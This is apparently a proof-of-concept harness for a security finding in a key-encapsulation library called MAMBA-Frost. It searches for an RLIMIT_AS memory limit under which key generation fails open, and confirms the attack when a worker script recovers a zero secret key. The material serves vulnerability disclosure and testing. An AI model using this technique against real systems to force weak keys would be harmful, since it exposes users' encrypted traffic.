#!/usr/bin/env python3
"""Reach MAMBA-Frost's fail-open key generation using only RLIMIT_AS."""

from __future__ import annotations

import os
from pathlib import Path
import shutil
import subprocess
import sys


HERE = Path(__file__).resolve().parent
WORKER = HERE / "reproduce_fail_open.py"


def main() -> int:
    prlimit = shutil.which("prlimit")
    if prlimit is None:
        print("SKIP kem-20-1: util-linux prlimit is unavailable", file=sys.stderr)
        return 77

    env = os.environ.copy()
    env.pop("LD_PRELOAD", None)
    # Python and loader footprints vary. Probe upward until the library maps
    # and key generation has enough working memory, but its N*N matrix does not.
    for mib in range(16, 129, 2):
        limit = mib * 1024 * 1024
        result = subprocess.run(
            [
                prlimit,
                f"--as={limit}",
                "--",
                sys.executable,
                str(WORKER),
                "--worker",
                "MAMBA-Frost-512",
            ],
            env=env,
            stdout=subprocess.PIPE,
            stderr=subprocess.DEVNULL,
            text=True,
            timeout=60,
        )
        if result.returncode == 0 and "zero secret RECOVERED" in result.stdout:
            print(f"MAMBA-Frost-512: RLIMIT_AS={mib} MiB reaches the fail-open key")
            print("ATTACK kem-20-1 CONFIRMED: an ordinary address-space limit creates a publicly decapsulatable key")
            return 0

    print("NOT-CONFIRMED kem-20-1: no fail-open RLIMIT_AS window found", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
